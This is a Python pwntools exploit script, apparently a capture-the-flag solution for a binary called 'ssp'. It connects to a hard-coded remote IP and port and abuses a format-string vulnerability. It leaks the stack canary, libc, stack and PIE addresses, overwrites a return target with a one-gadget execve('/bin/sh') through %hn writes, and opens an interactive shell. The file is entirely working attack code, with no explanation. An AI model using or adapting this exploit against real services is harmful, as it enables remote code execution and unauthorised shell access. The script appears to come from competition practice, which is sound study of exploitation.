from pwn import *
import time
debug=0


elf = ELF('./ssp')
#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
#libc = ELF(libc_name)
context.log_level = 'debug'
if debug:
	p= process('./ssp')
else:
	#p = remote('106.75.73.20', 8999)#process('./pwn1')
	p = remote('10.120.100.201', 8080)
def z(a =''):
	if debug:
		gdb.attach(p,a)
z('c')
p.recvuntil('$')
p.sendline('%'+str(0xb+5+1)+'$p')
canary = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)
print '[+]canary',hex(canary)
p.recvuntil('$')
p.sendline('%'+str(0xb+5+1+2)+'$p')
libc_address = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)-0x21b97#-231#-libc.symbols[' __libc_start_main']
print '[+]system',hex(libc_address + 0x4f440)
p.recvuntil('$')
p.sendline('%p')
stack = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)+0x28#-0x21b97#-231#-libc.symbols[' __libc_start_main']
print '[+]stack',hex(stack)

fmt = '%'+str(stack&0xffff)+'c%'+str(0xb+5+1+2+2)+'$hn'
p.recvuntil('$')
p.sendline(fmt)
onegadget = libc_address+0x4f322
fmt = '%'+str(onegadget&0xffff)+'c%'+str(0xb+5+1+2+2+26)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

fmt = '%'+str((stack&0xffff) +2)+'c%'+str(0xb+5+1+2+2)+'$hn'
p.recvuntil('$')
p.sendline(fmt)
onegadget = libc_address+0x4f322
fmt = '%'+str((onegadget>>16)&0xffff)+'c%'+str(0xb+5+1+2+2+26)+'$hn'
p.sendline(fmt)
p.recvuntil(' :invalid option.')
p.recvuntil(' :invalid option.')
p.recvuntil('$')
p.sendline('%'+str(0xb+5+1+1)+'$p')
pie = int(p.recvuntil(' :invalid option.').replace(' :invalid option.',''),16)-0x5380#-231#-libc.symbols[' __libc_start_main']
print '[+]pie',hex(pie )
fmt = '%'+str((stack&0xffff)-8)+'c%'+str(0xb+5+1+2+2)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

fmt = '%'+str(((pie + 0x2090FC)&0xffff))+'c%'+str(0xb+5+1+2+2+26)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

fmt = '%'+str((stack&0xffff)-8+2)+'c%'+str(0xb+5+1+2+2)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

fmt = '%'+str(((pie + 0x2090FC)>>16)&0xffff)+'c%'+str(0xb+5+1+2+2+26)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

fmt = '%7c%'+str(0xb+5+2)+'$hn'
p.recvuntil('$')
p.sendline(fmt)

'''
p.recvuntil('$')
p.sendline('a')
z('b malloc\nc')
p.recvuntil('>')
p.send(p32(0)+p32(0)+p32(0x10))
p.recvuntil('$')
p.sendline('a')
#z('b malloc\nc')
p.recvuntil('>')
p.send(p32(0)+p32(0)+p32(0x10))
p.recvuntil('$')
p.sendline('a')
#z('b malloc\nc')
p.recvuntil('>')
p.send(p32(0)+p32(0)+p32(0x10))
p.recvuntil('$')
p.sendline('a')
#z('b malloc\nc')
p.recvuntil('>')
p.send(p32(0)+p32(0)+p32(0x10))
'''

p.interactive()
'''
0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
